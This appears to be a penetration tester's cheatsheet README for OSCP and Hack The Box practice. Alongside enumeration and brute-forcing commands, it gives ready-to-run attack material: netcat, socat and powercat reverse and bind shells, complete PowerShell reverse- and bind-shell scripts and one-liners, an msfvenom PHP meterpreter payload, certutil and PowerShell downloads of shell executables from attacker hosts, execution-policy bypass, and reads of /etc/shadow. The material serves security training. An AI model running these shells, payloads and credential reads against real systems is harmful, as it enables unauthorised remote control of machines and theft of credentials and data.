# Hacking-Cheatsheet
In this repo I collect all commands, links, techniques and tricks I found during my work as pentester, hacker, OSCP student and hack the box fan.

# Basic Linux stuff you may need
Keyword search in man pages:
```bash
man -k <KEYWORD>
```
Alternatively:
```bash
apropos <KEYWORD>
```

## Find stuff
```bash
sudo find / -name <SEARCHTERM>
```

## Environment variables
basic environment variables you may need:
```bash
$PATH	#Search Paths
$USER	#Username
$PWD	#Current working directory
$HOME	#Homedirectory
```
get all environment variables:
```bash
env
```

## Bash history
saved to ~/.bash_history

show bash history:
```bash
history
```

 


# External Enumeration

## OSINT

### Whois
Forward / Reverse Search with whois
```bash
whois <DOMAIN> / <IP>
```

### Crawl words from website for passwordlist
```bash
cewl <domain> -m 6 -w words.txt
```

## Port-Scanning
Scan all ports with service detection
```bash
nmap -v -A -p- <Target-IP>
```

## Webserver Enumeration
### Vhost Enumeration
```
nmap --script=http-vhosts --script-args domain=<DOMAIN> -p80,443 -v <Target/DOMAIN>
```

## SMB-Enumeration

### Enum4Linux
```bash
enum4linux -a <IP>
```

### rpcclient
```bash
rpcclient -U "" <Target IP>
```
enter empty password

Commands in rpcclient console:
- srvinfo: Identify OS Versions
- enumdomusers: List of Usernames on this server
- getdompwinfo: Displays SMB password policy

### CrackMapExec
List of Users and Passwords to try:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
```

Login to WinRM (Alternative to evil-winrm):
```bash
crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
```
Hint: User needs to be in group "Remote Management Users"

Brute Usernames through RID
```bash
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --rid-brute
```


## SMTP-Enumeration
SMTP-Enumeration with netcat
```bash
for user in $(cat typical_usernames_SMTP_Enumeration.txt); do echo VRFY $user |nc -nv -w 1 <Target-IP> 25 2>/dev/null |grep ^"250";done
```

## SNMP-Enumeration

Enumerate set of IPs for different SNMP communities
```bash
onesixtyone -c community_names.txt -i ips.txt
```
examples for community names:
- public


Get list of running programs
```bash
snmpwalk -c public -v1 <Target-IP> 1.3.6.1.2.1.25.4.2.1.2
```

Get list of open ports
```bash
snmpwalk -c public -v1 <Target-IP> 1.3.6.1.2.1.6.13.1.3
```

Get list of installed software
```bash
snmpwalk -c public -v1 <Target-IP> 1.3.6.1.2.1.25.6.3.1.2
```

## Wordpress Enumeration
```bash
wpscan --update
wpscan --url <TARGET-URL>
```



# File Transfer and File Downloads

## Windows
### Download files with certutil
```cmd
certutil.exe -urlcache -f http://<ip>:<port>/<filename> <localfilename>
```
Example:
```cmd
certutil.exe -urlcache -f http://10.10.14.37:8080/shell.exe reverse_shell.exe
```

### Downlaod files with Powershell
Oneliner:
```cmd
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>','<TARGET-FILENAME>')"
```

Powershell-Script:
```cmd
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.30.5/exploit.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url, $file) >>wget.ps1
```

### Powercat Filetransfer
```powershell
PS> powercat -c <IP> -p <PORT> -i <FILENAME>
```

Execute File with: [Execute Powershell File, bypass all policies](#execute-powershell-file-bypass-all-policies)

## Linux
### wget
```bash
wget -O <filename.xyz> http://<URL>/
```

### curl
```bash
curl -o <filename.xyz> http://<URL>/
```

### axel
(very fast downloader (-n # gives number of connections))
```bash
axel -a -n 20 -o <filename.xyz> http://<URL>/
```

## nc / netcat
File receiver:
```
nc -nlvp 4444 > <FILENAME>
```
File sender:
```
nc -nv <IP> <PORT> < <FILENAME>
```

## socat
File sender:
```bash
socat TCP4-LISTEN:<PORT>,fork file:<FILENAME.xyz>
```
File receiver:
```
socat TCP4:<IP>:<PORT> file:<FILENAME>,create
```



## Python Webserver
Create webserver listening to port 8080 offering files from current working directory
```bash
python3 -m http.server 8080
```
#Exploiting

## SQL Injections

### Detect number of columns for UNION attack:
add a 
```SQL
ORDER BY 1--
```
statement to sql command.
Than increase number after ORDER BY until you receive a error => Value before is the correct number of columns for UNION statement.

## Wordpress Exploiting
When you have valid admin credentials for Wordpress installation use following script to generate malicious plugin and uploading the generated plugin to WP.
[https://github.com/wetw0rk/malicious-wordpress-plugin/blob/master/wordpwn.py](https://github.com/wetw0rk/malicious-wordpress-plugin/blob/master/wordpwn.py)

## Creating Exploits with msfvenom
### Web Payloads

#### PHP Meterpreter
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
```
Don't forget to remove the starting chars of the generated file.

## Buffer Overflows

### Create unique pattern
Create a unique pattern to identify correct position for buffer overflow
```bash
/usr/share/metasploit-framework/tools/pattern_create.rb <# bytes>
```

# Local Enumeration

## Local Linux Enumeration

### Gather information about current user
show username and groups of current user:
```bash
id
```

### System information/version
Show information about kernel and linux system
```bash
uname -a
```

Show linux version
```bash
cat /etc/issue
```

### Find local users
```bash
cat /etc/passwd
```

### Password hashes
```bash
cat /etc/shadow
```

### Find world writable files
```bash
find / -perm -2 ! -type l -ls 2>/dev/null
```

## Local Windows Enumeration

### Open Ports local
```cmd
netstat -an
```

### Check permission of executable
```bash
icacls <filename>
```

# Exploitation

## SSH Exploitation
Try given Username + Password combinations on SSH with nmap
```bash
nmap -p 22 --script ssh-brute --script-args userdb=userdb.lst,passdb=passdb.lst <IP>
```

## Local Windows Exploitation

### Service Exploitation
Dump full memory from service with Procdump
```cmd
.\procdump.exe -ma <PROCESS ID> <Filename>
```


# Post Exploitation

## Netcat Fun

Create netcat listener:
```
nc -nlvp <PORT>
```

Connect to port with netcat:
```
nc -nv <IP> <PORT>
```

### Filetransfer
File receiver:
```
nc -nlvp 4444 > <FILENAME>
```
File sender:
```
nc -nv <IP> <PORT> < <FILENAME>
```

### Netcat Shell
#### Bind Shell on Windows
```cmd
nc -nlvp 4444 -e cmd.exe
```
#### Bind Shell on Linux
```bash
nc -nlvp 4444 -e /bin/bash
```
#### Reverse Shell on Linux
```bash
nc -nv <IP> <PORT> -e /bin/bash
```
#### Reverse Shell on Windows
```cmd
nc -nv <IP> <PORT> -e cmd.exe
```

## Socat Fun
Connect to port with socat:
```bash
socat - TCP4:<IP>:<PORT>
```
Create listener with socat:
```bash
socat TCP-LISTEN:<PORT> STDOUT
```
### File Transfer with socat
File sender:
```bash
socat TCP4-LISTEN:<PORT>,fork file:<FILENAME.xyz>
```
File receiver:
```
socat TCP4:<IP>:<PORT> file:<FILENAME>,create
```

### Reverse Shell on Linux with socat
Listener:
```
socat -d -d TCP4-LISTEN:<PORT> STDOUT
```
Shell:
```
socat TCP4:<IP>:<PORT> EXEC:/bin/bash
```

### encrypted bind shell with socat
```bash
# create (self signed) SSL certificate:
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
# combine key and cetificate to pem file
cat bind_shell.key bind_shell.crt > bind_shell.pem
# create encrypted listener
socat OPENSSL-LISTEN:<PORT>,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
```
connect to encrypted bind shell:
```
socat - OPENSSL:<IP>:<PORT>,verify=0
```


## Linux Post Exploitation
### Create tty console with python
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/zsh")'
```
```bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/zsh")'
```

### Cracking encrypted zip-file
```bash
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' <zip-file-name>
```

## Windows Post Exploitation

### Powershell Fun
```powershell
Set-ExecutionPolicy Unrestricted
Get-ExecutionPolicy
```

#### Powershell File Transfer
```cmd
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>','<TARGET-FILENAME>')"
```

#### Powershell Shells
##### Powershell Reverseshell
```powershell
$client = New-Object System.Net.Sockets.TCPClient('<IP>', <PORT>);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush();
}

$client.Close();
```
Same as Oneliner:
```cmd
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>', <PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();""
```

##### Powershell Bind Shell
```powershell
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',<PORT>);
$listener.start();
$client = $listener.AcceptTcpClient();
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
	$sendback = (iex $data 2>&1 | Out-String );
	$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';
	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
	$stream.Write($sendbyte,0,$sendbyte.Length);
	$stream.Flush()
}

$client.Close();
$listener.Stop()
```

Same as Oneliner:
```cmd
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',<PORT>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();$listener.Stop()"
```

### Powercat
```powershell
# Load powercat script (only in current instance)
PS> . .\powercat.ps1
```
#### Powercat Filetransfer
```powershell
PS> powercat -c <IP> -p <PORT> -i <FILENAME>
```

#### Powercat Reverse Shell
```powershell
PS> powercat -c <IP> -p <PORT> -e cmd.exe
```

#### Powercat Bind Shell
```powershell
PS> powercat -l -p <PORT> -e cmd.exe
```

#### Powercat Standalone Payloads
Generate reverse shell payload with powercat:
```
# Payload generation:
PS> powercat -c <IP> -p <PORT> -e cmd.exe -g > reverseshell.ps1
# Execute on target PC:
PS> .\reversehell.ps1
```
Generate (base64) encoded reverse shell payload with powercat:
```
PS> powercat -c <IP> -p <PORT> -e cmd.exe -ge > encodedreverseshell.ps1
# Execute:
PS> powershell.exe -E <INSERT HERE BASE64 CONTENT OF GENERATED FILE>
```



### Execute Powershell file, bypass all policies
```cmd
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1
```

### RDP connection from Linux host to Windows target
```cmd
rdesktop -u <User> -p <Password> <Target-IP>
```

# Stuff you also may need

## Wireshark
### Display Filters
```
tcp.port == <PORT>
```

## Tcpdump
### read pcap file
```bash
tcpdump -r <FILENAME.pcap>
```
### skip DNS lookup:
```bash
tcpdump -n -r <FILENAME.pcap>
```
### find most common ips
```bash
tcpdump -n -r <FILENAME.pcap> | awk -F" " '{print $3}' | sort | uniq -c | head
# gives Result:
# <Number of Packets> <IP>
```
### destination host filter
```bash
tcpdump -n dst host <IP> -r <FILENAME.pcap>
```
### port filter
```bash
tcpdump -n port <PORT> -r <FILENAME.pcap>
```
### print packet data as Hex and ASCII
```bash
tcpdump -nX -r <FILENAME.pcap>
```
